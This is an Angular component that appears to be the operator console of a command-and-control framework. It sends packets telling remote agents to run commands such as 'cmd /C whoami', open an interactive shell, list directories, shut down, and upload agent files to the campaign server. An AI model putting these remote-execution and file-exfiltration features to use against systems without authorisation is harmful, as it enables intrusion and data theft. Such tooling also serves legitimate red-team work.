import { Component, OnInit, Input } from '@angular/core';
import { PacketInfo, Packet, Campaign, DirEntry } from '../app.model';
import { ApiService } from '../api.service';
import { HttpErrorResponse } from '@angular/common/http';
import { MatSnackBar } from '@angular/material/snack-bar';
import { DataService } from '../data.service';

@Component({
  selector: 'app-packet-create',
  templateUrl: './packet-create.component.html',
  styleUrls: ['./packet-create.component.css']
})
export class PacketCreateComponent implements OnInit {
  // Data
  @Input() computerId = "";


  // UI
  selectExecType: string = "line"

  serverurl: string = ""
  executable: string = ""
  param1: string = ""
  param2: string = ""
  param3: string = ""

  selectedTabIndex: number = 0

  uploadUrlBase: string = ""
  uploadSource: string = ""

  downloadUrlBase: string = ""
  downloadDestination: string = ""
  interactiveStdout: string = ""
  
  commandlineInteractive: string = "hostname"

  commandselect: number = 0
  commandline: string = "cmd /C hostname"
  interval: any

  downstreamId: string = "client"

  dirContent: DirEntry[] = [];
  browse: string = "./"

  downloadDestinationSelection = ""
  staticFiles: DirEntry[] = []

  constructor(
    private apiService: ApiService,
    private snackBar: MatSnackBar,
    private dataService: DataService
  ) { }

  ngOnInit(): void {
    // Default values (for testing)
    if (true) {
      this.apiService.getCampaign().subscribe(
        (campaign: Campaign) => { 
          this.executable = "cmd";
          this.param1 = "/C"
          this.param2 = "whoami"

          this.serverurl = campaign.ServerUrl;
    
          this.uploadUrlBase = campaign.ServerUrl + campaign.FileUploadPath;
          this.uploadSource = "README.md";
    
          this.downloadUrlBase = campaign.ServerUrl + campaign.FileDownloadPath;
          this.downloadDestination = "test.txt";
        },
        (err: HttpErrorResponse) => {
          console.log("HTTP Error: " + err);
        },
      );
    }

    // Files
    this.staticFiles = this.dataService.statics;
    // Subscribe to updates 
    this.dataService.clientFilesUpdates.subscribe((data: String) => {
      this.staticFiles = this.dataService.statics;
    })

    // Shell, Dir
    this.updateInteractive(); // Init immediately
    this.updateDir();
    // Update Packet data
    this.dataService.packetInfosEvent.subscribe((packetInfo: PacketInfo) => {
      // Check if it concerns us
      if (packetInfo == undefined || packetInfo.Packet.computerid == this.computerId) {
        this.updateInteractive();
        this.updateDir();
      }
    })

    // Downstream-Selection
    this.dataService.downstreamSelection.subscribe(downstreamId => {
      this.downstreamId = downstreamId;
      this.updateInteractive(); // Update the downstream immediately
    });
  }

  updateDir() {
    var data2 = this.dataService.packetInfos;
    var newData = data2.filter(d => 
      (d.Packet.computerid == this.computerId && d.Packet.packetType == "dir")
    );

    if (newData.length == 0) {
      return;
    }
    var latestPacket = newData[newData.length - 1].Packet
    if (! ("filelist" in latestPacket.response)) {
      return;
    }

    var json = latestPacket.response["filelist"];
    var data: DirEntry[] = JSON.parse(json); 
    this.dirContent = data;
  }


  updateInteractive() {
    var data2 = this.dataService.packetInfos;
    var newData = data2.filter(d => 
      (d.Packet.computerid == this.computerId || d.Packet.computerid == "0") 
      && (d.Packet.packetType == "iIssue" || d.Packet.packetType == "iOpen")
      && (d.Packet.downstreamId == "" || d.Packet.downstreamId == this.downstreamId)
    );
    
    this.commandlineInteractive = "";
    this.interactiveStdout = "";
    newData.forEach(element => {
      if (element.Packet.response.hasOwnProperty("stdout")) {
        this.interactiveStdout += element.Packet.response['stdout'];
      }
      if (element.Packet.response.hasOwnProperty("stderr")) {
        this.interactiveStdout += element.Packet.response['stderr'];
      }
      if (element.Packet.response.hasOwnProperty("error")) {
        this.interactiveStdout += element.Packet.response['error'];
      }
    });
  }

  sendPacketTest() {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'test',
      arguments: { "test": "test" },
      response: {},
      downstreamId: this.downstreamId,
    }

    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketShutdown() {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'shutdown',
      arguments: {},
      response: {},
      downstreamId: this.downstreamId,
    }
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketInteractiveCmdOpen(force: boolean) {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'iOpen',
      arguments: { },
      response: {},
      downstreamId: this.downstreamId,
    }
    if (force) {
      packet.arguments['force'] = "force";
    }

    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketInteractiveCmdIssue() {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'iIssue',
      arguments: { 'commandline': this.commandlineInteractive },
      response: {},
      downstreamId: this.downstreamId,
    }

    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketCmdClose() {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'iClose',
      arguments: { },
      response: {},
      downstreamId: this.downstreamId,
    }
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketExec() {
    var split = this.commandline.split(" ")
    var executable: string = split[0];
    var paramsArr = split.slice(1);

    var params:{ [id: string]: string } = {};
    if (this.selectExecType == "line") {
      params["executable"] = executable;
      for(var n=0; n<paramsArr.length; n++) {
        params["param" + n] = paramsArr[n];
      }
    } else if (this.selectExecType == "array") {
      params["executable"] = this.executable;
      if (this.param1 != "") {
        params["param0"] = this.param1;
      }
      if (this.param2 != "") {
        params["param1"] = this.param2;
      }
      if (this.param3 != "") {
        params["param2"] = this.param3;
      }
    } else {
      console.log("Unknown: " + this.selectExecType);
      return;
    }

    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'exec',
      arguments: params,
      response: {},
      downstreamId: this.downstreamId,
    }

    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }


  sendPacketUpload() {
    var packetId = this.apiService.getRandomInt();
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: packetId,
      packetType: 'fileupload',
      arguments: { 
        "remoteurl": this.uploadUrlBase + packetId,
        "source": this.uploadSource
      },
      response: {},
      downstreamId: this.downstreamId,
    }
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );
  }

  sendPacketDownload() {
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: this.apiService.getRandomInt(),
      packetType: 'filedownload',
      arguments: { 
        "remoteurl": this.downloadUrlBase + this.downloadDestinationSelection,
        "destination": this.downloadDestination
      },
      response: {},
      downstreamId: this.downstreamId,
    }
/*
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")
      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );*/
  }


  sendPacketDir() {
    var packetId = this.apiService.getRandomInt();
    var packet: Packet = {
      computerid: this.computerId, 
      packetid: packetId,
      packetType: 'dir',
      arguments: { 
        "path": this.browse,
      },
      response: {},
      downstreamId: this.downstreamId,
    }
    this.apiService.sendPacket(packet).subscribe(
      (data: any) => { 
        console.log("SendPacket successful")

        // Subscribe to new packets until ours is found

      },
      (err: HttpErrorResponse) => {
        console.log("SendPacket failed")
      },
    );

  }

  // Utils:

  openSnackBar(message: string, action: string) {
    this.snackBar.open(message, action, {
      duration: 3000
    });
  }
 

}
